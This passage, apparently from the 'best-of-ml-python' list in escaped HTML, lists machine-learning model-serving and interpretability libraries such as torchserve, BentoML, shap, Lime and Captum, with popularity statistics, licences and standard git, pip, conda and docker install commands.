520 · 📥 1.8K · 📋 890 - 14% open · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/pytorch/serve&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/torchserve&#34;&gt;PyPi&lt;/a&gt; (📥 21K / month · 📦 9 · ⏱️ 13.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install torchserve&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/pytorch/torchserve&#34;&gt;Conda&lt;/a&gt; (📥 23K · ⏱️ 13.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c pytorch torchserve&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://hub.docker.com/r/pytorch/torchserve&#34;&gt;Docker Hub&lt;/a&gt; (📥 1M · ⭐ 12 · ⏱️ 13.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; docker pull pytorch/torchserve&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/openai/triton&#34;&gt;triton&lt;/a&gt;&lt;/b&gt; (🥈29 · ⭐ 3.6K) - Development repository for the Triton language and compiler. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/openai/triton&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 41 · 🔀 290 · 📦 100 · 📋 200 - 37% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/openai/triton&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/triton&#34;&gt;PyPi&lt;/a&gt; (📥 100K / month · 📦 3 · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install triton&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/bentoml/BentoML&#34;&gt;BentoML&lt;/a&gt;&lt;/b&gt; (🥈27 · ⭐ 3.5K) - The Unified Model Serving Framework. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/bentoml/BentoML&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 100 · 🔀 390 · 📥 1.5K · 📋 590 - 10% open · ⏱️ 12.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/bentoml/BentoML&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/bentoml&#34;&gt;PyPi&lt;/a&gt; (📥 32K / month · 📦 2 · ⏱️ 06.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install bentoml&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/microsoft/hummingbird&#34;&gt;Hummingbird&lt;/a&gt;&lt;/b&gt; (🥈26 · ⭐ 2.8K) - Hummingbird compiles trained ML models into tensor computation for.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/microsoft/hummingbird&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 29 · 🔀 220 · 📥 170 · 📦 32 · 📋 240 - 20% open · ⏱️ 27.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/microsoft/hummingbird&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/hummingbird-ml&#34;&gt;PyPi&lt;/a&gt; (📥 2.4K / month · ⏱️ 25.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install hummingbird-ml&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/hummingbird-ml&#34;&gt;Conda&lt;/a&gt; (📥 7.5K · ⏱️ 02.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge hummingbird-ml&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/BayesWitnesses/m2cgen&#34;&gt;m2cgen&lt;/a&gt;&lt;/b&gt; (🥈26 · ⭐ 2.1K) - Transform ML models into a native code (Java, C, Python, Go, JavaScript,.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/BayesWitnesses/m2cgen&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 13 · 🔀 190 · 📥 16 · 📦 34 · 📋 90 - 26% open · ⏱️ 23.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/BayesWitnesses/m2cgen&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/m2cgen&#34;&gt;PyPi&lt;/a&gt; (📥 42K / month · 📦 3 · ⏱️ 26.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install m2cgen&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/cortexlabs/cortex&#34;&gt;cortex&lt;/a&gt;&lt;/b&gt; (🥉25 · ⭐ 7.7K) - Production infrastructure for machine learning at scale. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/cortexlabs/cortex&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 24 · 🔀 590 · 📋 1.1K - 9% open · ⏱️ 23.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/cortexlabs/cortex&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/cortex&#34;&gt;PyPi&lt;/a&gt; (📥 1.9K / month · 📦 1 · ⏱️ 10.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install cortex&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/nok/sklearn-porter&#34;&gt;sklearn-porter&lt;/a&gt;&lt;/b&gt; (🥉25 · ⭐ 1.2K · 📈) - Transpile trained scikit-learn estimators to C, Java,.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/nok/sklearn-porter&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 12 · 🔀 160 · 📦 43 · 📋 76 - 55% open · ⏱️ 22.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/nok/sklearn-porter&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/sklearn-porter&#34;&gt;PyPi&lt;/a&gt; (📥 270 / month · 📦 1 · ⏱️ 18.12.2019):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install sklearn-porter&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/gmalivenko/pytorch2keras&#34;&gt;pytorch2keras&lt;/a&gt;&lt;/b&gt; (🥉20 · ⭐ 790 · 💤) - PyTorch to Keras model convertor. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/gmalivenko/pytorch2keras&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 13 · 🔀 130 · 📦 46 · 📋 120 - 44% open · ⏱️ 06.08.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/gmalivenko/pytorch2keras&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pytorch2keras&#34;&gt;PyPi&lt;/a&gt; (📥 740 / month · 📦 1 · ⏱️ 14.05.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pytorch2keras&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/nebuly-ai/nebullvm&#34;&gt;nebullvm&lt;/a&gt;&lt;/b&gt; (🥉17 · ⭐ 1.1K · 🐣) - Easy-to-use library to boost AI inference leveraging state-of-.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/nebuly-ai/nebullvm&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 7 · 🔀 52 · 📦 1 · 📋 38 - 60% open · ⏱️ 23.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/nebuly-ai/nebullvm&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/nebullvm&#34;&gt;PyPi&lt;/a&gt; (📥 640 / month · ⏱️ 10.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install nebullvm&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;Show 4 hidden projects...&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/microsoft/MMdnn&#34;&gt;mmdnn&lt;/a&gt;&lt;/b&gt; (🥉25 · ⭐ 5.6K · 💀) - MMdnn is a set of tools to help users inter-operate among different deep.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/larq/compute-engine&#34;&gt;Larq Compute Engine&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 190) - Highly optimized inference engine for Binarized.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/riga/tfdeploy&#34;&gt;tfdeploy&lt;/a&gt;&lt;/b&gt; (🥉16 · ⭐ 350 · 💀) - Deploy tensorflow graphs for fast evaluation and export to.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/backprop-ai/backprop&#34;&gt;backprop&lt;/a&gt;&lt;/b&gt; (🥉13 · ⭐ 230 · 💤) - Backprop makes it simple to use, finetune, and deploy state-of-.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;Model Interpretability&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#contents&#34;&gt;&lt;img align=&#34;right&#34; width=&#34;15&#34; height=&#34;15&#34; src=&#34;https://git.io/JtehR&#34; alt=&#34;Back to top&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Libraries to visualize, explain, debug, evaluate, and interpret machine learning models.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/slundberg/shap&#34;&gt;shap&lt;/a&gt;&lt;/b&gt; (🥇40 · ⭐ 16K) - A game theoretic approach to explain the output of any machine learning model. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/slundberg/shap&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 180 · 🔀 2.4K · 📦 5.5K · 📋 1.9K - 69% open · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/slundberg/shap&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/shap&#34;&gt;PyPi&lt;/a&gt; (📥 4.9M / month · 📦 220 · ⏱️ 20.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install shap&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/shap&#34;&gt;Conda&lt;/a&gt; (📥 1.2M · ⏱️ 23.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge shap&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/arviz-devs/arviz&#34;&gt;arviz&lt;/a&gt;&lt;/b&gt; (🥇34 · ⭐ 1.2K) - Exploratory analysis of Bayesian models with Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/arviz-devs/arviz&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 120 · 🔀 280 · 📥 110 · 📦 2.3K · 📋 730 - 20% open · ⏱️ 18.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/arviz-devs/arviz&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/arviz&#34;&gt;PyPi&lt;/a&gt; (📥 450K / month · 📦 100 · ⏱️ 13.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install arviz&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/arviz&#34;&gt;Conda&lt;/a&gt; (📥 720K · ⏱️ 17.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge arviz&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/lutzroeder/netron&#34;&gt;Netron&lt;/a&gt;&lt;/b&gt; (🥇33 · ⭐ 19K) - Visualizer for neural network, deep learning, and machine.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/lutzroeder/netron&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 2 · 🔀 2.2K · 📥 43K · 📦 7 · 📋 800 - 2% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/lutzroeder/netron&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/netron&#34;&gt;PyPi&lt;/a&gt; (📥 11K / month · 📦 65 · ⏱️ 21.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install netron&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/marcotcr/lime&#34;&gt;Lime&lt;/a&gt;&lt;/b&gt; (🥇32 · ⭐ 9.8K · 💤) - Lime: Explaining the predictions of any machine learning classifier. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3rqEWVr&#34;&gt;BSD-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/marcotcr/lime&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 61 · 🔀 1.5K · 📦 2.3K · 📋 560 - 6% open · ⏱️ 29.07.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/marcotcr/lime&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/lime&#34;&gt;PyPi&lt;/a&gt; (📥 500K / month · 📦 110 · ⏱️ 26.06.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install lime&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/lime&#34;&gt;Conda&lt;/a&gt; (📥 100K · ⏱️ 28.06.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge lime&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/interpretml/interpret&#34;&gt;InterpretML&lt;/a&gt;&lt;/b&gt; (🥇32 · ⭐ 4.7K) - Fit interpretable models. Explain blackbox machine learning. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1E&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/interpretml/interpret&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 29 · 🔀 580 · 📦 210 · 📋 290 - 32% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/interpretml/interpret&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/interpret&#34;&gt;PyPi&lt;/a&gt; (📥 90K / month · 📦 8 · ⏱️ 23.09.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install interpret&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/pytorch/captum&#34;&gt;Captum&lt;/a&gt;&lt;/b&gt; (🥇31 · ⭐ 3.2K) - Model interpretability and understanding for PyTorch. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/pytorch/captum&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 83 · 🔀 330 · 📦 550 · 📋 360 - 23% open · ⏱️ 19.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/pytorch/captum&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/captum&#34;&gt;PyPi&lt;/a&gt; (📥 53K / month · 📦 19 · ⏱️ 03.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install captum&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/captum&#34;&gt;Conda&lt;/a&gt; (📥 920 · ⏱️ 04.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge captum&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tensorflow/model-analysis&#34;&gt;Model Analysis&lt;/a&gt;&lt;/b&gt; (🥇31 · ⭐ 1.2K) - Model analysis tools for TensorFlow. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1E&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/tensorflow/model-analysis&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 43 · 🔀 250 · 📋 76 - 35% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/tensorflow/model-analysis&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tensorflow-model-analysis&#34;&gt;PyPi&lt;/a&gt; (📥 930K / month · 📦 21 · ⏱️ 16.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tensorflow-model-analysis&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/MAIF/shapash&#34;&gt;shapash&lt;/a&gt;&lt;/b&gt; (🥈30 · ⭐ 1.7K) - Shapash makes Machine Learning models transparent and.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1E&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/MAIF/shapash&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 34 · 🔀 230 · 📦 74 · 📋 120 - 15% open · ⏱️ 09.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/MAIF/shapash&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/shapash&#34;&gt;PyPi&lt;/a&gt; (📥 19K / month · 📦 1 · ⏱️ 09.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install shapash&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/SeldonIO/alibi&#34;&gt;Alibi&lt;/a&gt;&lt;/b&gt; (🥈30 · ⭐ 1.6K) - Algorithms for explaining machine learning models. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/SeldonIO/alibi&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 18 · 🔀 190 · 📦 170 · 📋 300 - 42% open · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/SeldonIO/alibi&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/alibi&#34;&gt;PyPi&lt;/a&gt; (📥 24K / month · 📦 24 · ⏱️ 18.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install alibi&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/DistrictDataLabs/yellowbrick&#34;&gt;yellowbrick&lt;/a&gt;&lt;/b&gt; (🥈29 · ⭐ 3.6K) - Visual analysis and diagnostic tools to facilitate machine.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/DistrictDataLabs/yellowbrick&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 100 · 🔀 520 · 📋 660 - 13% open · ⏱️ 22.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/DistrictDataLabs/yellowbrick&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  